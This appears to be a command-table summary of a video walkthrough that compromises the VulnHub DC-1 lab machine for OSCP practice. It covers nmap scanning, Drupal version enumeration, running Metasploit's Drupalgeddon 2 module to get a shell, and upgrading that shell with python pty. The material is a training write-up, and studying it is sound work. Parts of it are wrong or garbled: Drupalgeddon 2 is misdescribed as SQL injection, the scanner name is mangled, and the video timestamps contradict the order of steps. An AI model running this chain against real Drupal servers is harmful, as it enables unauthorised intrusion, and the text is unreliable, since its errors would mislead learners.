This walkthrough for the VulnHub DC-1 machine, which is excellent preparation for the OSCP exam, covers the essential phases of a penetration test: enumeration, exploitation, and privilege escalation.

***

## 1. Initial Enumeration and Reconnaissance

The initial phase focuses on discovering open ports, running services, and the target's operating system and versioning.

| Command | Purpose | Notes / Key Takeaways | Timestamp |
| :--- | :--- | :--- | :--- |
| `nmap -p- -sC -sV [TARGET_IP] --open` | Full port scan to discover all open ports and run default scripts (`-sC`) to identify service versions (`-sV`). | The scan reveals **Port 80 (HTTP)** running a web server and **Port 22 (SSH)**. | [[01:49:58](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=6598)] |
| Manual Web Enumeration | Browsing the target IP and checking files like `/robots.txt`. | Reveals the target is running a **Drupal Content Management System (CMS)** on a **Debian** operating system. | [[03:24:46](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=12286)] |

***

## 2. Web Vulnerability Scanning and Exploitation

The focus shifts to the open web service (Drupal) to find a version-specific vulnerability.

### A. DrupScan for Versioning

| Command | Purpose | Notes / Key Takeaways | Timestamp |
| :--- | :--- | :--- | :--- |
| `pip3 install drup scan==1.4.0.1` | **Installation** of the correct DrupScan version (if not already installed). | The speaker notes that specific versions are sometimes required to avoid errors with modern Python. | [[10:01](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=601)] |
| `drup scan scan --drupal -u http://[TARGET_IP]/` | Scans the Drupal site for installed modules, themes, and version information. | The scan identifies a version between **7.22 and 7.26**, which is vulnerable to **Drupalgeddon**. | [[12:06](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=726)] |

### B. Exploitation via Metasploit

The **Drupalgeddon 2** vulnerability (CVE-2018-7600) is used to gain an initial shell.

| Command | Purpose | Notes / Key Takeaways | Timestamp |
| :--- | :--- | :--- | :--- |
| `msfconsole` | Launches the Metasploit Framework console. | This is a required tool for OSCP, but its use is restricted to one machine/process in the exam. | [[13:02](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=782)] |
| `search drupal` | Finds relevant Metasploit modules. | The search results confirm the existence of the `drupal_drupalgeddon2` module. | [[13:10](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=790)] |
| `use exploit/unix/webapp/drupal_drupalgeddon2` | Selects the Drupalgeddon 2 module. | This module uses a SQL injection vulnerability to achieve remote code execution. | [[13:38](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=818)] |
| `set RHOSTS [TARGET_IP]` | Sets the target machine's IP address. | Always verify required options by typing `options` before running the exploit. | [[13:52](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=832)] |
| `run` or `exploit` | Executes the module to gain a shell. | Results in a **Meterpreter session**, which is then converted to a **shell** session. | [[16:20](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=980)] |

### C. Shell Stabilization

After obtaining a shell, it is stabilized into a fully interactive TTY for better usability.

| Command | Purpose | Notes / Key Takeaways | Timestamp |
| :--- | :--- | :--- | :--- |
| `shell` | Drops from the Meterpreter session to a system shell. | The initial shell is often non-interactive. | [[17:06](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=1026)] |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Uses Python to spawn a fully functional bash TTY shell. | Essential for using commands like `clear` and for smoother interaction. | [[17:31](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=1051)] |

